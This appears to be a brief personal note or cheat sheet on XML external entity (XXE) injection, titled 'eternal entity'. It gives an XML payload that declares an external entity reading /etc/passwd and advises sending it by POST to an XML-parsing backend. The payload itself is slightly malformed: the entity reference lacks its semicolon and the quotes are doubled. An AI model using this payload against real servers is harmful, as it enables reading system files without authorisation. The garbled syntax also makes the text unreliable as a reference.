eternal entity
Example of payload
```
<?xml version =''''1.0'''' encoding=''''ISO-8859-1''''?>
<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY xxe SYSTEM ''''file:///etc/passwd''''>] >
<foo>
	&xxe
</foo>
```
Request could be send on your server with prepared exploit

it should be captured with POST request, when sends XML backend 